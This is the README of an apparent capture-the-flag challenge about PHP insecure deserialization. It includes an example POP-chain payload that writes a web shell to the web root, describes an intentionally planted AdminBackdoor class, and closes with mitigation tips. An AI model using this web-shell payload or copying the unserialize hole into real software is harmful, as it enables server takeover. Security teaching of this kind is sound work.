# CobraLogs: Admin Backdoor CTF Challenge

## Overview
CobraLogs is a logging application designed to demonstrate the concept of PHP insecure deserialization and property-oriented programming (POP) chain exploits. The application allows users to export their activity logs in a serialized format, which can be manipulated to execute arbitrary commands on the server.

## Project Structure
```
cobralogs-ctf
├── public
│   ├── index.php
│   └── export_logs.php
├── lib
│   └── AdminBackdoor.php
├── logs
├── Dockerfile
└── README.md
```

## Setup Instructions
1. **Clone the Repository**
   ```
   git clone <repository-url>
   cd cobralogs-ctf
   ```

2. **Build the Docker Image**
   ```
   sudo docker build -t cobralogs-ctf .
   ```

3. **Run the Docker Container**
   ```
   sudo docker run -d -p 80:80 cobralogs-ctf
   ```

4. **Access the Application**
   Open your web browser and navigate to `http://localhost`.

## Challenge Details
### Title: CobraLogs: Admin Backdoor
- **Category**: Web Exploitation
- **Difficulty**: Medium-Hard

### Description
The application allows users to export their logs in a serialized format. However, it is vulnerable to insecure deserialization, allowing an attacker to craft a malicious payload that can execute arbitrary commands on the server.

### Exploit Workflow
1. **Discover the Hidden Class**: The application uses PHP's `unserialize()` function without validation, allowing for the exploitation of the `AdminBackdoor` class.
2. **Craft a Payload**: Create a serialized object that includes a `Logger` object to write a web shell and an `AdminBackdoor` object to execute commands.
3. **Send the Payload**: Use a tool like `curl` to send the crafted payload to the `export_logs.php` endpoint.

### Example Payload
```php
$logger = new Logger();
$logger->filename = "/var/www/html/shell.php";
$logger->content = "<?php system(\$_GET['cmd']); ?>";

$backdoor = new AdminBackdoor();
$backdoor->cmd = "cat /flag > /var/www/html/flag.txt";

$payload = [$logger, $backdoor];
echo base64_encode(serialize($payload));
```

## Mitigation Tips
- Avoid using `unserialize()` on user input.
- Use safer alternatives like `json_encode()` and `json_decode()`.
- Implement strict validation and sanitization of user inputs.

## License
This project is for educational purposes only. Use it responsibly and ethically.